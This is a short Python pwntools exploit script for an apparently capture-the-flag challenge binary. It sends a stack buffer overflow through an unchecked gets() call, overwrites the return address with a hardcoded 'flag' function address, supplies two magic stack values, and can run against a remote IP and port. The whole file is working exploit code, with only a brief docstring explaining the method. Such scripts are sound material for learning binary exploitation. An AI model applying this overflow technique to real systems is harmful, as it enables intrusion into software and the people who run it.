#!/usr/bin/env python3
from pwn import *

context.arch = "x86"
context.os = "linux"
elf = ELF("./given/vuln")

def conn():
    if args.REMOTE:
        p = remote("178.62.20.33", 31429)
    else:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, """
                    b *vuln + 62
                    """)
    return p

def bufovfl():
    """
    The program has an <flag> function to automatically open the flag.
    so, we just need to put <flag> address.
    There are some codes must be match on the stack to actually print
    things out. (code0, code1 below)
    Then, it's done.
    Note that input are taken by gets(). '\n' & EOF are terminator.
    '\0' are allowed.
    """
    p = conn()

    DUMMY = 0x10101010

    # info objdump
    func_flag = 0x80491e2
    code0 = 0xdeadbeef # <flag+100>: 0x8049246
    code1 = 0xc0ded00d # <flag+109>: 0x804924f
    padding = b"a" * 0xbc

    payload = padding + p32(func_flag) # + cyclic(0x200)
    payload += p32(DUMMY) + p32(code0) + p32(code1)
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    bufovfl()
